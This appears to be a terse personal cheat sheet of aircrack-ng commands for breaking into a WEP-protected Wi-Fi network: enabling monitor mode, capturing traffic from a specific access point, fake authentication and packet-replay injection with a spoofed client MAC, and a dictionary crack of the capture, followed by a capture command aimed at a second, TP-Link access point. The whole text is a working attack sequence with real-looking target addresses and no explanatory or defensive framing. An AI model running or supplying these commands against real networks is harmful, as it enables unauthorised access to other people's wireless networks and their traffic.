1, airmon-ng start wlan0
2, airodump-ng mon0
3, airodump-ng --channel 1 --bssid 28:2C:B2:A0:61:4C --write wep mon0
4, aireplay-ng -1 0 -a 28:2C:B2:A0:61:4C -h b4:b2:fe:2b:4b:cb mon0
5, aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 28:2C:B2:A0:61:4C -h b4:b2:fe:2b:4b:cb mon0
6, aircrack-ng -w /usr/share/dict/web2  /test/wep-01.cap

00:21:27:5E:8B:0C  channel 6
airodump-ng --channel 6 --bssid 00:21:27:5E:8B:0C --write TP_Link5E8B0C mon0

